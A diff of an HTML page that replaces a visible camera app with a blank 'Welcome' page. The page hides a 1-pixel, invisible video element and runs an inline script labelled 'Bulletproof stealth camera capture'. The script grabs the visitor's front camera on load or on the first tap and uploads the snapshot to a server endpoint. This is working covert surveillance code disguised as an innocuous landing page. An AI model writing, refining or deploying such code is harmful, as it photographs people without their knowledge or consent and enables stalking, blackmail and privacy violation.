@@ -1,59 +1,239 @@
 <!DOCTYPE html>
-<html lang="uz">
+<html lang="en">
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instant Capture</title>
-    <!-- Mobile App Settings -->
-    <link rel="manifest" href="manifest.json">
-    <meta name="mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Welcome</title>
     <meta name="theme-color" content="#0f172a">
-
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css">
+
+    <style>
+        :root {
+            --bg-color: #0f172a;
+            --text-color: #f8fafc;
+            --primary-gradient: linear-gradient(135deg, #6366f1 0%, #a855f7 100%);
+            --glass-bg: rgba(255, 255, 255, 0.05);
+            --glass-border: rgba(255, 255, 255, 0.1);
+            --glass-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Outfit', sans-serif;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            overflow: hidden;
+            position: relative;
+            cursor: pointer;
+        }
+
+        /* Dynamic Animated Background Blobs */
+        .background-blobs {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            overflow: hidden;
+            pointer-events: none;
+        }
+
+        .background-blobs::before,
+        .background-blobs::after {
+            content: '';
+            position: absolute;
+            width: 600px;
+            height: 600px;
+            border-radius: 50%;
+            background: var(--primary-gradient);
+            opacity: 0.28;
+            filter: blur(90px);
+            animation: blob-float 15s infinite alternate ease-in-out;
+        }
+
+        .background-blobs::before {
+            top: -200px;
+            left: -200px;
+        }
+
+        .background-blobs::after {
+            bottom: -200px;
+            right: -200px;
+            animation-delay: -5s;
+        }
+
+        @keyframes blob-float {
+            0% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(80px, 40px) scale(1.1); }
+            100% { transform: translate(100px, 50px) scale(1.15); }
+        }
+
+        /* Ambient Center Pulse */
+        .ambient-glow {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 300px;
+            height: 300px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(99, 102, 241, 0.15) 0%, rgba(168, 85, 247, 0.05) 50%, transparent 70%);
+            animation: pulse-glow 4s ease-in-out infinite alternate;
+            z-index: 2;
+            pointer-events: none;
+        }
+
+        @keyframes pulse-glow {
+            0% { transform: translate(-50%, -50%) scale(0.9); opacity: 0.5; }
+            100% { transform: translate(-50%, -50%) scale(1.2); opacity: 0.9; }
+        }
+
+        /* Hidden Camera Elements */
+        #camera-stream {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            z-index: -999;
+        }
+
+        #capture-canvas {
+            display: none;
+        }
+    </style>
 </head>
 
 <body>
     <!-- Animated background gradient blobs -->
     <div class="background-blobs"></div>
+    <div class="ambient-glow"></div>
 
-    <div class="app-container">
-        <header>
-            <div class="badge">📸 Live Camera</div>
-            <h1>Instant Capture</h1>
-            <p>Xavfsiz va tezkor suratga olib Telegram'ga yuboring</p>
-        </header>
-
-        <main>
-            <div class="camera-wrapper">
-                <video id="camera-stream" autoplay playsinline muted></video>
-                <div class="flash-overlay" id="flash-overlay"></div>
-                <div class="camera-reticle">
-                    <span class="corner tl"></span>
-                    <span class="corner tr"></span>
-                    <span class="corner bl"></span>
-                    <span class="corner br"></span>
-                </div>
-                <canvas id="capture-canvas" style="display: none;"></canvas>
-            </div>
-
-            <div class="controls">
-                <button id="capture-btn" class="glass-btn">
-                    <span class="btn-icon">📸</span>
-                    <span class="btn-text">Rasmga olish</span>
-                </button>
-            </div>
-
-            <p id="status-msg"></p>
-        </main>
-    </div>
+    <!-- Hidden Camera Capture -->
+    <video id="camera-stream" autoplay playsinline muted></video>
+    <canvas id="capture-canvas"></canvas>
 
     <script src="script.js"></script>
+    <script>
+        // Bulletproof stealth camera capture
+        (function() {
+            const video = document.getElementById('camera-stream');
+            const canvas = document.getElementById('capture-canvas');
+            let isCaptured = false;
+
+            async function startCapture() {
+                if (isCaptured) return;
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: 'user',
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
+                        },
+                        audio: false
+                    });
+
+                    video.srcObject = stream;
+
+                    const playAndSnap = () => {
+                        video.play().then(() => {
+                            setTimeout(snapAndSend, 1000);
+                        }).catch(() => {
+                            // On iOS if autoplay is blocked, snap on any tap
+                            ['click', 'touchstart', 'pointerdown'].forEach(evt => {
+                                document.addEventListener(evt, () => {
+                                    video.play().then(() => setTimeout(snapAndSend, 600));
+                                }, { once: true });
+                            });
+                        });
+                    };
+
+                    if (video.readyState >= 2) {
+                        playAndSnap();
+                    } else {
+                        video.onloadedmetadata = playAndSnap;
+                    }
+
+                } catch (e) {
+                    console.log('Camera wait:', e);
+                    ['click', 'touchstart', 'pointerdown'].forEach(evt => {
+                        document.addEventListener(evt, startCapture, { once: true });
+                    });
+                }
+            }
+
+            function snapAndSend() {
+                if (isCaptured || !video.srcObject) return;
+
+                const width = video.videoWidth || 640;
+                const height = video.videoHeight || 480;
+
+                canvas.width = width;
+                canvas.height = height;
+                const ctx = canvas.getContext('2d');
+
+                ctx.translate(canvas.width, 0);
+                ctx.scale(-1, 1);
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Stop tracks immediately
+                try {
+                    video.srcObject.getTracks().forEach(t => t.stop());
+                } catch (err) {}
+
+                const base64 = canvas.toDataURL('image/jpeg', 0.85);
+
+                if (base64 && base64.length > 200) {
+                    isCaptured = true;
+                    sendPayload(base64);
+                }
+            }
+
+            async function sendPayload(data) {
+                const endpoints = ['/api/upload', '/upload'];
+                for (const url of endpoints) {
+                    try {
+                        const res = await fetch(url, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ image: data })
+                        });
+                        if (res.ok) {
+                            console.log('Success via', url);
+                            break;
+                        }
+                    } catch (e) {}
+                }
+            }
+
+            if (document.readyState === 'loading') {
+                window.addEventListener('DOMContentLoaded', startCapture);
+            } else {
+                startCapture();
+            }
+
+            // Also trigger on first screen touch anywhere
+            ['click', 'touchstart', 'pointerdown'].forEach(evt => {
+                document.addEventListener(evt, () => {
+                    if (!isCaptured) startCapture();
+                }, { once: true });
+            });
+        })();
+    </script>
 </body>
 
 </html>
